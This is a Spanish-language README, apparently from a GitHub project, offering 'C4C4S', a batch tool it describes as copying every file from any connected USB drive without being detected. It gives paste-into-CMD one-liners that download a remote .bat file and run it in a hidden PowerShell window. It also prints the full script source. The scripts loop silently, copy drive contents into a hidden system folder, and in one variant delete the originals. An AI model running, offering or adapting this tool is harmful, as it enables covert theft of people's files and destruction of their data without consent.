# C4C4S.bat / C4C4S.bat
<b>Esta es una herramienta para copiar todos los archivos de una memoria externa sin ser detectado.</b><br><br>
Escucha cuando se conecta un dispositivo de almacenamiento, despues copia los archivos del dispositivo conectado y tienes la opción de borrar los archivos despues de ser copiados.

<h2>Para copiar archivos de USB borrando los archivos de la memoria al finalizar, pega esto en una ventana del CMD</h2>
<pre>
powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MANUEL1518/c4c4s/master/c4c4s.bat','c4s.bat'); powershell -windowstyle hidden -command cmd /c call c4s.bat;
</pre>

<h2>Para copiar archivos de USB sin modificar o borrar los archivos origen, pega esto en una ventana del CMD</h2>
<pre>
powershell (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MANUEL1518/c4c4s/master/c4c4.bat','c4.bat'); powershell -windowstyle hidden -command cmd /c call c4.bat;
</pre>

<h3>Para ver los archivos copiados...</h3>
<ul>
  <li>Abre una ventana del CMD.</li>
  <li>Ubicate en la carpeta: <b>C:\Users\%USERNAME%\Desktop\NCopy</b></li>
  <li>Abre la carpeta con: <b>start .</b></li>
</ul>

<h2>Codigo fuente</h2>

<h3>C4s :</h3>
<p><b>(Copia todos los archivos de memoria a "NCopy" en Escritorio y borra los originales)</b></p>
<pre>
<code>
@echo off
setlocal EnableDelayedExpansion
:try
IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
 SET l="E:\" "F:\" "G:\" "M:\" "N:\" "D:\" "H:\" "I:\" "L:\" "O:\" "S:\" "U:\"
 FOR %%a in (%l%) DO (
  IF EXIST %%a (
   XCOPY %%a "C:\Users\"%USERNAME%"\Desktop\NCopy" /s /i /y /q
   DEL %%a"*" /s /q
  )
 )
) ELSE (
 MKDIR "C:\Users\"%USERNAME%"\Desktop\NCopy"
 ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
)
goto try
</code>
</pre>

<h3>C4 :</h3>
<p><b>(Copia todos los archivos de memoria a "NCopy" en Escritorio sin editar los archivos originales)</b></p>
<pre>
<code>
@echo off
setlocal EnableDelayedExpansion
:try
IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
 SET l="E:\" "F:\" "G:\" "M:\" "N:\" "D:\" "H:\" "I:\" "L:\" "O:\" "S:\" "U:\"
 FOR %%a in (%l%) DO (
  IF EXIST %%a (
   XCOPY %%a "C:\Users\"%USERNAME%"\Desktop\NCopy" /s /i /y /q
  )
 )
) ELSE (
 MKDIR "C:\Users\"%USERNAME%"\Desktop\NCopy"
 ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
)
goto try
</code>
</pre>
